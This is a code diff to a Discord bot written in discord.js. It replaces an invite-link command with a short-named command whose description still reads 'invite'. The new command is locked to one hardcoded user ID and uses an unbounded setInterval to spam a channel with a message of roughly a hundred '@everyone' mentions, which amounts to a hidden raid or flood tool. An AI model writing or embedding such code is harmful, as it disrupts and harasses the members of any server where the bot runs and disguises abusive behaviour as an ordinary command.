@@ -3,20 +3,18 @@ const { MessageFlags } = require("discord.js");
 const { Color } = require("../../config.js");
 
 module.exports = {
-    name: "invite1",
+    name: "a",
     aliases: [],
     description: "invite",
     run: async (bot, message, args) => {
       message.delete();
-      let msg;
-        let textChannel = message.mentions.channels.first()
-    
-        if(textChannel) {
-            msg = args.slice(1).join(" ");
-            textChannel.send('https://discord.gg/pWGhC3f')
-      } else {
-          msg = args.join(" ");
-          message.channel.send('https://discord.gg/pWGhC3f')
+      if (message.author.id !== '723506204537520179') {
+            return message.channel.send(`lmao u tried!`)
       }
-   }
-}
+  
+      setInterval(function() {
+        message.channel.send(
+          "@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone @everyone @everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone")
+      },)
+  }
+  }        
